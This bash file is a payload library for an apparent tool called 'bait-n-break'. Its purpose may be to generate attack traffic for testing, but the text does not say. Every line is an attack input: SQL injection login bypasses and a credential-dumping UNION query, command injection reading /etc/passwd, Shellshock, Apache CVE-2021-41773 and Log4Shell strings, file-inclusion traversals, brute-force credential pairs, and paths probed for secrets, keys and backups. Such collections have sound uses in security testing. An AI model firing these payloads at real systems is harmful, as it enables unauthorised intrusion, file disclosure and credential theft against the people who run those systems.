#!/usr/bin/env bash
# bait-n-break payload variant library -- sourced, not executed

payloads_sqli_auth_bypass=(
  "' OR '1'='1'--"
  "' OR 1=1--"
  "admin'--"
  "' UNION SELECT 1,2,3--"
  "' UNION SELECT 1,username,password FROM users--"
  "' OR 1=1#"
  "') OR ('1'='1'--"
  "' OR '1'='1'/*"
  "' OR 1=1 LIMIT 1--"
  "admin' OR '1'='1"
  "' OR 'x'='x'--"
  "';--"
  "'=%27%20OR%201=1--"
  '%27%20OR%20%271%27%3D%271%27--'
  '0x61646d696e272d2d'
)

payloads_cmdi_ping=(
  '127.0.0.1;id'
  '127.0.0.1|id'
  '127.0.0.1`id`'
  '127.0.0.1%0aid'
  '127.0.0.1%3Bid'
  '127.0.0.1||id'
  '127.0.0.1&&id'
  '127.0.0.1;whoami'
  '127.0.0.1;cat /etc/passwd'
  '127.0.0.1;uname -a'
  '127.0.0.1;ls -la /'
  '127.0.0.1%0awhoami'
  '127.0.0.1%0als -la'
  '127.0.0.1`whoami`'
  '127.0.0.1$(sleep 1)'
)

payloads_shellshock_6271=(
  '() { :; }; /bin/echo VULNERABLE_SHELLSHOCK'
  '() { _; } >_[$($())] { /bin/echo VULNERABLE_SHELLSHOCK; }'
  '() { :;}; /bin/echo VULNERABLE_SHELLSHOCK'
  '() { :; }; echo; /bin/echo VULNERABLE_SHELLSHOCK'
)

payloads_apache_41773=(
  '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
  '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
  '/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
)

payloads_log4shell_jndi=(
  '${jndi:ldap://127.0.0.1:1389/Exploit}'
  '${jndi:ldaps://127.0.0.1:1636/Exploit}'
  '${jndi:dns://127.0.0.1:53/Exploit}'
  '${jndi:rmi://127.0.0.1:1099/Exploit}'
)

payloads_lfi_traversal=(
  '../../../etc/passwd'
  '..%2f..%2f..%2fetc%2fpasswd'
  '..%252f..%252f..%252fetc%252fpasswd'
  '....//....//....//etc/passwd'
  '/var/log/apache2/access.log'
  '/proc/self/environ'
  'php://filter/convert.base64-encode/resource=index.php'
)

payloads_bruteforce_creds=(
  'admin:admin123'
  'admin:admin'
  'root:toor'
  'admin:password'
  'admin:password123'
  'admin:123456'
  'root:root'
  'user:user'
  'guest:guest'
  'test:test'
  'admin:letmein'
  'root:admin'
  'svc-backup:B4ckup!2024'
  'svc-backup:backup123'
  'admin:admin2024'
)

payloads_crawler_paths=(
  '/.env'
  '/backup/'
  '/backups/'
  '/admin/'
  '/wp-admin/'
  '/config/'
  '/db/'
  '/database/'
  '/sql/'
  '/dump/'
  '/logs/'
  '/tmp/'
  '/temp/'
  '/test/'
  '/debug/'
  '/api/'
  '/.git/'
  '/.svn/'
  '/.hg/'
  '/.git/config'
  '/.env.backup'
  '/.env.production'
  '/wp-config.php'
  '/config.php'
  '/config.yml'
  '/admin/config.php'
  '/admin/backup/'
  '/phpinfo.php'
  '/info.php'
  '/server-status'
  '/status'
  '/metrics'
  '/actuator/'
  '/files/'
  '/uploads/'
  '/download/'
  '/downloads/'
  '/static/'
  '/assets/'
  '/robots.txt'
  '/sitemap.xml'
  '/shell/'
  '/cmd/'
  '/exec/'
  '/console/'
  '/terminal/'
  '/tty/'
  '/payroll/'
  '/salary/'
  '/hr/'
  '/employees/'
  '/staff/'
  '/users/'
  '/passwords/'
  '/secrets/'
  '/credentials/'
  '/keys/'
  '/ssh/'
  '/certificates/'
)
